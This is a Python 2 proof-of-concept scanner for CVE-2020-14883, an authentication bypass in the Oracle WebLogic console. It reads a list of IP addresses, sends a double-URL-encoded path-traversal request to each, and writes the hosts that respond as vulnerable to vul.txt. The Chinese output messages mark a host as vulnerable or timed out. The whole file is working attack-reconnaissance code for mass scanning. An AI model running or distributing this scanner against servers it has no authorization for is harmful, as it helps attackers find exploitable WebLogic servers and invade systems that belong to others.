#!/usr/bin/env python
# coding:utf-8
# author:B1anda0

import requests,sys,colorama
from colorama import *
init(autoreset=True)

banner='''
 CCC V     V EEEE      22   000   22   000       11  4  4  888   888  333  
C    V     V E        2  2 0  00 2  2 0  00     111  4  4 8   8 8   8    3 
C     V   V  EEE  ---   2  0 0 0   2  0 0 0 ---  11  4444  888   888   33  
C      V V   E         2   00  0  2   00  0      11     4 8   8 8   8    3 
 CCC    V    EEEE     2222  000  2222  000      11l1    4  888   888  333                                                                            
'''

def poc():
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	path = '/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal'
	url='http://{}:{}'.format(ips,port)
	poc=url+path
	try:
		response=requests.get(poc,headers=headers,timeout=10,verify=False)
		if response.status_code==200 and "/console/consolejndi.portal" in response.content:
			print(u"\033[1;31;40m[+]{}:{} 存在Weblogic身份验证绕过漏洞".format(ips,port))
			#将漏洞地址输出在Vul.txt中
			f=open('vul.txt','a')
			f.write(url)
			f.write('\n')
		else:
			print('[-]{}:{} None'.format(ips,port))
	except:
		print( u'{} 请求超时'.format(url))

if __name__ == '__main__':
	print banner
	if len(sys.argv)!=3:
		print'Example:python CVE-2020-14883-Multiple.py ip.txt port'
	else:
		file = open(sys.argv[1])
		for ip in file.readlines():
			ips=ip.strip()
			port=sys.argv[2]
			poc()
		print('Check Over')
